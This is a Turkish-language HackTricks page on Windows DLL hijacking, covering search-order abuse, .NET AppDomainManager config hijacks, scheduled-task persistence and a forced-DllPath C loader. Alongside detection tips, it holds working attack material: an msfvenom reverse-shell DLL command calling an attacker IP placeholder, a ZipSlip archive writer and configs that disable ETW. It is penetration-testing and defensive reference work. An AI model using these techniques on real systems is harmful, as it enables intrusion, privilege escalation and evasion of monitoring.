# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilir bir uygulamanın kötü amaçlı bir DLL yüklemesini sağlamayı içerir. Bu terim, **DLL Spoofing, Injection ve Side-Loading** gibi çeşitli taktikleri kapsar. Başlıca code execution ve persistence sağlamak, daha nadiren de privilege escalation elde etmek için kullanılır. Burada privilege escalation üzerinde durulsa da hijacking yöntemi, hedef ne olursa olsun aynıdır.

### Yaygın Teknikler

DLL hijacking için çeşitli yöntemler kullanılır. Her yöntemin etkililiği, uygulamanın DLL yükleme stratejisine bağlıdır:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Gerçek bir DLL'yi kötü amaçlı bir DLL ile değiştirmek; orijinal DLL'nin işlevselliğini korumak için isteğe bağlı olarak DLL Proxying kullanılır.
2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'yi, uygulamanın arama düzeninden yararlanarak meşru DLL'den önce gelen bir arama yoluna yerleştirmek.
3. **Phantom DLL Hijacking**: Uygulamanın var olmayan, gerekli bir DLL olduğunu düşünerek yükleyeceği kötü amaçlı bir DLL oluşturmak.
4. **DLL Redirection**: Uygulamayı kötü amaçlı DLL'ye yönlendirmek için `%PATH%` veya `.exe.manifest` / `.exe.local` dosyaları gibi arama parametrelerini değiştirmek.
5. **WinSxS DLL Replacement**: Meşru DLL'yi WinSxS dizininde kötü amaçlı bir karşılığıyla değiştirmek; bu yöntem sıklıkla DLL side-loading ile ilişkilendirilir.
6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'yi kopyalanan uygulamayla birlikte kullanıcı denetimindeki bir dizine yerleştirmek; bu, Binary Proxy Execution tekniklerine benzer.

Bir uygulama **kendi DLL loader'ını** da kullanabilir. Ayrıcalıklı bir işlem, `Libraries` veya `Plugins` gibi bir alt dizini numaralandırıp seçilen bir DLL'yi yardımcı bir programa iletebilir; bu işlem normal Windows DLL arama sırasından bağımsızdır. Başka bir hesap tam olarak bu dizinde dosya oluşturabiliyorsa, bunu incelenmesi gereken bir bulgu olarak değerlendirin: işlemin kimliğini, dizinin etkin ACL'sini, dosya seçim kuralını ve erişilebilir bir yükleme işlemi olup olmadığını doğrulayın. Bir yürütülebilir dosyanın yanındaki yazılabilir bir dizin, işlemin oradan DLL yüklediğini kanıtlamaz.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Kurulum sonrası PE import grafting

Klasik side-loading, güvenilir PE'yi değiştirmeden DLL ad çözümlemesini kendi lehine kullanır. **Import grafting** ise güvenilir program tarafından zaten yüklenmiş bir PE'yi değiştirir. Saldırgan, saldırganın denetimindeki bir DLL için bir import descriptor ve buna karşılık gelen lookup/IAT girişleri ekler. Windows bu bağımlılığı özyinelemeli olarak çözümlerken eklenen DLL'yi belleğe eşler ve aksi hâlde meşru olan işlemin içinde başlatma kodunu çalıştırır. Bu, diskteki bir PE'nin değiştirilmesidir; canlı bir IAT işlev işaretçisinin çalışma zamanında bir hook ile değiştirilmesiyle aynı işlem değildir.<sup>[[26]](#references)[[27]](#references)</sup>

Değiştirilen PE, kullanıcının veya Task Scheduler'ın başlattığı yürütülebilir dosya yerine bir ara vendor DLL'si olabilir. Yeniden kullanılabilir bir zincir şöyledir:<sup>[[27]](#references)</sup>

1. Meşru yürütülebilir dosyayı ve bağımlılıklarını saldırganın denetimindeki bir dizine kopyalayın.
2. Bağımlılıklardan birinin import yapılarını, beklenen export'larını ve normal davranışını koruyarak kötü amaçlı DLL'ye başvuracak şekilde yamalayın.
3. Meşru yürütülebilir dosyayı başlatacak bir autorun veya scheduled task yapılandırın. Loader, değiştirilmiş bağımlılığı ve ardından yeni import edilen DLL'yi belleğe eşler. Task'ları numaralandırmak için bkz. [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks).
4. Maliyetli işlemleri `DllMain` dışında tutun; gözlemlenen loader bir worker thread oluşturup aşamalı şifre çözme işlemine orada devam etti.

Vendor paketi temizken import değişikliği kurulumdan sonra gerçekleşiyorsa bu durum, vendor tarafındaki bir supply-chain saldırısından farklıdır. Yalnızca ana EXE'yi değil, aşamalandırılmış dizindeki tüm modülleri inceleyin: bağımlılık import listelerini ve hash'lerini bilinen temiz bir kurulumla karşılaştırın, imzaları doğrulayın ve `C:\ProgramData` gibi beklenmedik, yazılabilir konumlardan başlatılan vendor binary'lerini araştırın. Böyle bir dizindeki kopyalanmış bir crash reporter veya updater'ı başlatan scheduled task, özellikle yararlı bir iz sürme noktasıdır.<sup>[[27]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + saldırgan assembly'si)

Klasik DLL sideloading, güvenilir bir **.NET Framework** işleminin saldırgan kodu yüklemesini sağlamanın tek yolu değildir. Hedef yürütülebilir dosya **managed** bir uygulamaysa, CLR ayrıca yürütülebilir dosyanın adını taşıyan bir **application configuration file**'a da başvurur (örneğin `Setup.exe.config`). Bu dosya özel bir **AppDomainManager** tanımlayabilir. Yapılandırma dosyası, EXE'nin yanına yerleştirilmiş saldırgan denetimindeki bir assembly'yi gösteriyorsa CLR, **uygulamanın normal kod yolundan önce** bu assembly'yi yükler ve güvenilir işlemin içinde çalıştırır.<sup>[[24]](#references)</sup>

Microsoft'un .NET Framework yapılandırma şemasına göre özel yöneticinin kullanılması için hem `<appDomainManagerAssembly>` hem de `<appDomainManagerType>` bulunmalıdır.<sup>[[16]](#references)[[17]](#references)</sup>

En temel yapılandırma:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimal yönetici:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Uygulamaya yönelik notlar:
- Bu, **.NET Framework'e özgü** bir tradecraft'tır. Win32 DLL arama sırasına değil, CLR yapılandırmasının ayrıştırılmasına dayanır.
- Ana makine gerçekten **managed bir EXE** olmalıdır. Hızlı ön inceleme için `sigcheck -m target.exe`, `corflags target.exe` komutlarını kullanın veya PE metadata'sında **CLR Runtime Header** olup olmadığını kontrol edin.
- Yapılandırma dosyasının adı, yürütülebilir dosyanın adıyla tam olarak eşleşmelidir (`<binary>.config`) ve genellikle **EXE'nin yanında** bulunur.
- Bu yöntem, **imzalı Microsoft/vendor ikilileriyle** kullanışlıdır; çünkü güvenilir EXE'ye dokunulmazken kötü amaçlı managed assembly aynı süreç içinde çalışır.
- Yazılabilir bir yükleyici/güncelleme dizininiz varsa, AppDomainManager hijacking **ilk aşama** olarak kullanılabilir; sonraki aşamalarda klasik DLL sideloading veya reflective loading uygulanabilir.

### İndirici + zamanlanmış görev bootstrap'ı olarak AppDomainManager

Pratik bir saldırı örüntüsü, güvenilir managed EXE'yi hem kötü amaçlı bir `*.config` dosyasıyla hem de yalnızca **küçük bir bootstrapper** görevi gören kötü amaçlı bir AppDomainManager DLL'siyle eşleştirmektir:<sup>[[25]](#references)</sup>

1. Kullanıcı, imzalı bir .NET yükleyicisini veya güncelleyicisini `%USERPROFILE%\Downloads` gibi inandırıcı bir konumdan başlatır.
2. Yanındaki yapılandırma dosyası, CLR'nin saldırganın assembly'sini **meşru uygulama mantığı başlamadan önce** yüklemesine neden olur.
3. Kötü amaçlı manager bir **yol denetimi** yapar (örneğin, yalnızca ana makine EXE'si `Downloads` içinden çalışıyorsa devam eder ve ikinci aşamanın yalnızca `%LOCALAPPDATA%` içinden çalışmasına izin verir).
4. Denetim başarılı olursa, gerçek payload'u `%LOCALAPPDATA%\PerfWatson2.exe` gibi kullanıcının yazabildiği bir konuma indirir ve zamanlanmış görev kullanarak kalıcılık sağlar.

Bu varyant neden önemlidir:
- İmzalı ana makine EXE'si değişmeden kalır; bu nedenle yalnızca ana ikilinin hash'ini kontrol eden ön incelemeler ihlali fark etmeyebilir.
- Basit **yol tabanlı anti-analysis** yaygındır: ZIP/EXE/DLL üçlüsünü Desktop, Temp veya bir sandbox yoluna taşımak zinciri kasıtlı olarak bozabilir.
- İlk aşamadaki AppDomainManager DLL'si küçük ve düşük profilli kalırken gerçek implant daha sonra indirilebilir.

Bu örüntüde sık görülen minimal bir kalıcılık örneği:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notlar:
- `/rl highest`, bu kullanıcı/oturum için **kullanılabilir en yüksek** düzey anlamına gelir; tek başına garantili bir SYSTEM yetki yükseltmesi değildir.
- Bu teknik, klasik eksik-DLL arama sırası hijacking'inden ziyade **.NET config abuse yoluyla execution/persistence** olarak sınıflandırılır; ancak operatörler sıklıkla ikisini birlikte kullanır.

Tespit ipuçları:
- **ZIP çıkarma dizinlerinden**, `Downloads`, `%TEMP%` veya kullanıcıların yazabildiği diğer klasörlerden başlatılan ve yanında `<exe>.config` bulunan imzalı .NET executable'ları.
- Eylemi `%LOCALAPPDATA%`, `%APPDATA%` veya `Downloads` içindeki bir konumu gösteren ve adları tarayıcı/üretici updater'larını taklit eden yeni scheduled task'lar.
- Hemen başka bir EXE indiren ve ardından `schtasks.exe` başlatan kısa ömürlü managed bootstrap process'leri.
- Executable path'i beklenen bir kullanıcı profili diziniyle eşleşmediğinde erken çıkan örnekler.

### Sideload zincirini yeniden başlatmak için mevcut bir scheduled task'ı hijack etme

Persistence için yalnızca **yeni bir task oluşturulmasını** aramayın. Bazı intrusion set'leri, meşru bir installer'ın **normal bir updater task'ı** oluşturmasını bekler ve ardından mevcut task'ın action'ını **yeniden yazar**; böylece mevcut ad, yazar ve tetikleyici savunmacılara tanıdık görünmeye devam eder.

Yeniden kullanılabilir iş akışı:
1. Meşru yazılımı yükleyin/çalıştırın ve normalde oluşturduğu task'ı belirleyin.
2. Task XML'ini dışa aktarın ve mevcut `<Exec><Command>` / `<Arguments>` değerlerini not edin.<sup>[[23]](#references)</sup>
3. Yalnızca action'ı değiştirerek task'ın, kullanıcıların yazabildiği bir staging dizinindeki **trusted host EXE**'yi başlatmasını sağlayın; bu EXE daha sonra gerçek payload'ı side-load eder veya AppDomain-load eder.
4. Yeni ve bariz bir persistence artifact'ı oluşturmak yerine aynı task adını yeniden kaydedin.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Why it is stealthier:
- Görev adı hâlâ meşru görünebilir (örneğin bir vendor updater).
- **Task Scheduler hizmeti** işlemi başlatır; bu nedenle üst/ata süreç doğrulaması genellikle `explorer.exe` yerine beklenen zamanlama zincirini görür.
- Yalnızca **yeni görev adlarını** arayan DFIR ekipleri, kaydı önceden mevcut olan ancak eylemi artık `%LOCALAPPDATA%`, `%APPDATA%` veya saldırganın kontrolündeki başka bir yolu gösteren bir görevi gözden kaçırabilir.

Hızlı avlama noktaları:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML dosyalarını ve `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` meta verilerini bir temel değerle karşılaştırın.
- **Kullanıcının yazabildiği dizinlerden** çalışan veya yanındaki `*.config` dosyasıyla birlikte bir .NET EXE başlatan **vendor updater gibi görünen görevler** için uyarı oluşturun.

> [!TIP]
> HTML hazırlama, AES-CTR yapılandırmaları ve .NET implantlarını DLL sideloading üzerine katmanlandıran adım adım bir zincir için aşağıdaki iş akışını inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Eksik DLL'leri bulma

Bir sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırıp **aşağıdaki 2 filtreyi ayarlamaktır**:

![Common Techniques - Eksik DLL'leri bulma: Bir sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'tan procmon çalıştırıp aşağıdaki 2 filtreyi ayarlamaktır](<../../../images/image (961).png>)

![Common Techniques - Eksik DLL'leri bulma: Bir sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'tan procmon çalıştırıp aşağıdaki 2 filtreyi ayarlamaktır](<../../../images/image (230).png>)

ve yalnızca **File System Activity** etkinliklerini gösterin:

![Common Techniques - Eksik DLL'leri bulma: ve yalnızca File System Activity etkinliklerini gösterin](<../../../images/image (153).png>)

Genel olarak **eksik DLL'leri** arıyorsanız bunu birkaç **saniye** çalışır durumda **bırakın**.\
Belirli bir yürütülebilir dosyada **eksik bir DLL** arıyorsanız, **"Process Name" "contains" `<exec name>`** gibi başka bir filtre ayarlayın, dosyayı çalıştırın ve olay yakalamayı durdurun.<sup>[[9]](#references)</sup>

## Eksik DLL'lerden Yararlanma

Yetki yükseltmek için, ayrıcalıklı bir işlemin yazabildiğiniz bir konumdan yüklemeye çalıştığı bir **DLL** arayın. Bu, meşru DLL'yi içeren dizinden önce aranan bir dizini kontrol ettiğinizde veya istenen DLL mevcut olmadığında ve aranan dizinlerden birine yazabildiğinizde gerçekleşebilir.

### DLL Arama Sırası

**[Microsoft belgelerinde](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) DLL'lerin nasıl yüklendiğine ilişkin ayrıntıları bulabilirsiniz.**

**Windows uygulamaları**, önceden tanımlanmış bir dizi **arama yolunu** belirli bir sırayla izleyerek DLL'leri arar. DLL hijacking, zararlı bir DLL bu dizinlerden birine stratejik olarak yerleştirilip gerçek DLL'den önce yüklenmesi sağlandığında ortaya çıkar. Bunu önlemenin bir yolu, uygulamanın gereksinim duyduğu DLL'lere başvururken mutlak yollar kullanmasını sağlamaktır.

Aşağıda **32-bit** sistemlerdeki **DLL arama sırasını** görebilirsiniz:

1. Uygulamanın yüklendiği dizin.
2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) işlevini kullanın.(_C:\Windows\System32_)
3. 16-bit sistem dizini. Bu dizinin yolunu alan bir işlev yoktur, ancak dizin aranır. (_C:\Windows\System_)
4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) işlevini kullanın.
   1. (_C:\Windows_)
5. Geçerli dizin.
6. PATH ortam değişkeninde listelenen dizinler. Bunun **App Paths** kayıt defteri anahtarında belirtilen uygulamaya özel yolu içermediğine dikkat edin. DLL arama yolu hesaplanırken **App Paths** anahtarı kullanılmaz.

Bu, **SafeDllSearchMode** etkinken kullanılan **varsayılan** arama sırasıdır. Bu özellik devre dışıyken geçerli dizin ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt defteri değerini oluşturup 0 olarak ayarlayın (varsayılan olarak etkindir).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) işlevi **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa arama, **LoadLibraryEx**'in yüklediği yürütülebilir modülün bulunduğu dizinde başlar.

Son olarak, bir DLL adı yerine mutlak yolu kullanılarak yüklenebilir. Bu durumda Windows, DLL'nin kendisi için yalnızca belirtilen yola bakar; adla istenen bağımlılıklar ise geçerli arama sırasını izlemeye devam eder.

Arama sırasını değiştirmenin başka yolları da var, ancak bunları burada açıklamayacağım.

### Keyfi dosya yazımını eksik DLL hijacking'e zincirleme

**İlgili teknik:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. İşlemin yokluğunu saptadığı DLL adlarını toplamak için **ProcMon** filtrelerini (`Process Name` = hedef EXE, `Path` `.dll` ile biter, `Result` = `NAME NOT FOUND`) kullanın.<sup>[[14]](#references)</sup>
2. İkili dosya bir **zamanlama/hizmet** kapsamında çalışıyorsa, bu adlardan birine sahip bir DLL'yi **uygulama dizinine** (arama sırası #1) bırakmak, DLL'nin sonraki çalıştırmada yüklenmesini sağlar. Bir .NET tarayıcı örneğinde işlem, gerçek kopyayı `C:\Program Files\dotnet\fxr\...` konumundan yüklemeden önce `C:\samples\app\` içinde `hostfxr.dll` dosyasını arıyordu.
3. Herhangi bir export içeren bir payload DLL oluşturun (ör. reverse shell): `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Primitive'iniz **ZipSlip tarzı keyfi yazma** ise DLL'nin uygulama klasörüne düşmesi için ayıklama dizininin dışına çıkan bir ZIP girdisi oluşturun:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Arşivi izlenen gelen kutusuna/paylaşıma teslim edin; zamanlanmış görev işlemi yeniden başlattığında, işlem zararlı DLL'i yükler ve kodunuzu hizmet hesabı olarak çalıştırır.

### RTL_USER_PROCESS_PARAMETERS.DllPath aracılığıyla sideloading'i zorlama

Yeni oluşturulan bir işlemin DLL arama yolunu deterministik olarak etkilemenin gelişmiş bir yolu, işlemi ntdll'nin yerel API'leriyle oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Burada saldırganın kontrolündeki bir dizin belirtilirse, içe aktarılan bir DLL'i ada göre çözen (mutlak yol kullanmayan ve güvenli yükleme bayraklarını kullanmayan) bir hedef işlem, bu dizindeki zararlı DLL'i yüklemeye zorlanabilir.

Temel fikir
- RtlCreateProcessParametersEx ile işlem parametrelerini oluşturun ve kontrolünüzdeki klasörü (ör. dropper/unpacker'ınızın bulunduğu dizini) gösteren özel bir DllPath belirtin.
- RtlCreateUserProcess ile işlemi oluşturun. Hedef ikili bir DLL'i ada göre çözdüğünde, yükleyici çözümleme sırasında belirtilen DllPath'i kontrol ederek, zararlı DLL hedef EXE ile aynı dizinde olmadığında bile güvenilir sideloading yapılmasını sağlar.

Notlar/sınırlamalar
- Bu, oluşturulan alt işlemi etkiler; yalnızca geçerli işlemi etkileyen SetDllDirectory'den farklıdır.
- Hedef, bir DLL'i ada göre içe aktarmalı veya LoadLibrary ile yüklemelidir (mutlak yol kullanmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanmamalıdır).
- KnownDLLs ve sabit kodlanmış mutlak yollar ele geçirilemez. Forwarded exports ve SxS öncelik sırasını değiştirebilir.

Minimal C örneği (ntdll, geniş dizgeler, basitleştirilmiş hata işleme):

<details>
<summary>Tam C örneği: RTL_USER_PROCESS_PARAMETERS.DllPath aracılığıyla DLL sideloading'i zorlama</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Operasyonel kullanım örneği
- Gerekli işlevleri dışa aktaran veya gerçek DLL'ye proxy oluşturan kötü amaçlı bir xmllite.dll dosyasını DllPath dizininize yerleştirin.
- Yukarıdaki tekniği kullanarak xmllite.dll dosyasını adına göre aradığı bilinen imzalı bir binary başlatın. Loader, import'u sağlanan DllPath üzerinden çözümler ve DLL'nizi sideload eder.

Bu tekniğin gerçek saldırılarda çok aşamalı sideloading zincirlerini başlatmak için kullanıldığı gözlemlenmiştir: ilk başlatıcı bir yardımcı DLL bırakır; bu DLL de saldırganın DLL'sini bir hazırlık dizininden yüklemeye zorlamak için özel bir DllPath ile Microsoft imzalı, hijack edilebilir bir binary başlatır.<sup>[[6]](#references)</sup>


### `.exe.config` üzerinden .NET AppDomainManager hijacking

**.NET Framework** hedeflerinde sideloading, belleğe patch uygulamadan **`Main()` öncesinde**, uygulamanın yanındaki **`.exe.config`** dosyasını kötüye kullanarak yapılabilir. Saldırgan yalnızca Win32 DLL arama sırasına güvenmek yerine, meşru bir .NET EXE dosyasını kötü amaçlı bir config ve saldırganın denetimindeki bir veya daha fazla assembly ile aynı dizine yerleştirir.

Zincirin işleyişi:<sup>[[15]](#references)[[22]](#references)</sup>
1. Ana EXE başlar ve **CLR, `<exe>.config` dosyasını okur**.
2. Config, çalışma zamanının saldırganın denetimindeki bir `AppDomainManager` örneğini oluşturması için **`<appDomainManagerAssembly>`** ve **`<appDomainManagerType>`** değerlerini ayarlar.
3. Kötü amaçlı manager, güvenilir ana bilgisayar süreci içinde **`Main()` öncesinde kod yürütür**.
4. Aynı config, CLR'yi önce yerel assembly'leri çözümlemeye zorlayabilir (örneğin `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) ve inline patch uygulamadan çalışma zamanı doğrulamasını/telemetrisini zayıflatabilir.

Kampanya tarzı örüntü (tam iç içe yerleşim, directive'e / CLR sürümüne göre değişebilir):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Neden yararlıdır:
- **`<probing privatePath="."/>`**, assembly çözümlemesini uygulama dizininde tutarak bu klasörü öngörülebilir bir sideloading yüzeyine dönüştürür.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`**, meşru uygulama mantığı çalışmadan önce, CLR başlatılırken yürütmeyi saldırganın koduna taşır.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`**, full-trust bir uygulamanın strong-name doğrulaması başarısız olmadan unsigned veya kurcalanmış assembly’leri yüklemesine olanak sağlayabilir.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`**, publisher-policy yönlendirmelerinin daha yeni assembly’lere gitmesini önler.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`**, runtime seçimini daha öngörülebilir hâle getirir.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** özellikle dikkat çekicidir; çünkü implantın bellekte `EtwEventWrite` işlevine yama uygulaması yerine, CLR kendi ETW görünürlüğünü yapılandırma üzerinden devre dışı bırakır.

Son kampanyalarda görülen operasyonel model:
- Aşama 1, `setup.exe`, `setup.exe.config` ve yerel assembly’leri bırakır.
- Aşama 2, bunları inandırıcı görünen bir **AppData update** klasörüne kopyalar, ana dosyayı `update.exe` gibi bir adla yeniden adlandırır ve bir **scheduled task** aracılığıyla yeniden başlatır.
- Aşama 3, son RAT DLL/export’unu yüklemeden önce yürütme bağlamını (örneğin Task Scheduler’dan beklenen üst süreç `svchost.exe`) doğrular.

Avlanma fikirleri:
- Kullanıcının yazabildiği konumlarda, şüpheli yan **`.config`** dosyalarıyla çalışan imzalı veya başka şekilde meşru **.NET executable** dosyaları.
- **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** veya **`etwEnable enabled="false"`** içeren `.config` dosyaları.
- Yeniden adlandırılmış update binary dosyalarını **`%LOCALAPPDATA%`** veya uygulamaya özgü `\bin\update\` dizinlerinden yeniden başlatan scheduled task’ler.
- Bir scheduled task’in güvenilir bir .NET host’u başlattığı ve bu host’un hemen kendi dizininden tedarikçi dışı assembly’leri yüklediği üst/alt süreç zincirleri.

#### Windows belgelerinde DLL search order istisnaları

Windows belgelerinde standart DLL search order için belirli istisnalar belirtilmiştir:

- Belleğe önceden yüklenmiş bir DLL ile aynı ada sahip bir **DLL** ile karşılaşıldığında, sistem olağan aramayı atlar. Bunun yerine, varsayılan olarak bellekteki DLL’yi kullanmadan önce yönlendirme ve manifest kontrolü yapar. **Bu senaryoda sistem DLL’yi aramaz**.
- DLL’nin geçerli Windows sürümü için **known DLL** olduğu anlaşılırsa sistem, arama işlemini **atlayarak**, bağımlı DLL’leriyle birlikte known DLL’nin kendi sürümünü kullanır. **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** kayıt defteri anahtarı bu known DLL’lerin listesini tutar.
- Bir **DLL’nin bağımlılıkları** varsa bu bağımlı DLL’ler, ilk DLL tam yol üzerinden tanımlanmış olsa bile, yalnızca **modül adlarıyla** belirtilmiş gibi aranır.

### Ayrıcalıkları Yükseltme

**Gereksinimler**:

- **Farklı ayrıcalıklarla** (horizontal veya lateral movement) çalışan ya da çalışacak ve **DLL’si eksik** olan bir süreç belirleyin.
- **DLL’nin** aranacağı tüm **dizinlere** yazma erişiminizin olduğundan emin olun. Bu konum, executable’ın dizini veya sistem yolundaki bir dizin olabilir.

Bu önkoşullar varsayılan olarak nadiren görülür: ayrıcalıklı executable’ların genellikle eksik DLL bağımlılıkları olmaz ve standart kullanıcılar normalde sistem arama yolu dizinlerine yazamaz. Ancak hatalı yapılandırılmış ortamlar her iki koşulu da ortaya çıkarabilir.\
Gereksinimler karşılanıyorsa [UACME](https://github.com/hfiref0x/UACME) projesine göz atın. Ana amacı UAC bypass olsa da belirli Windows sürümlerine yönelik DLL-hijacking PoC’leri içerir; bunlar çoğu zaman bulduğunuz yazılabilir dizine uyarlanabilir.

Bir klasördeki **izinlerinizi** şu şekilde **kontrol edebileceğinizi** unutmayın:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Ve **PATH içindeki tüm klasörlerin izinlerini de kontrol edin**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bir executable'ın import'larını ve DLL'in export'larını şu komutla da kontrol edebilirsiniz:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

**System Path klasörüne yazma izinleriyle DLL Hijacking'i kötüye kullanarak ayrıcalıkları yükseltme** hakkında eksiksiz bir rehber için şuraya bakın:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

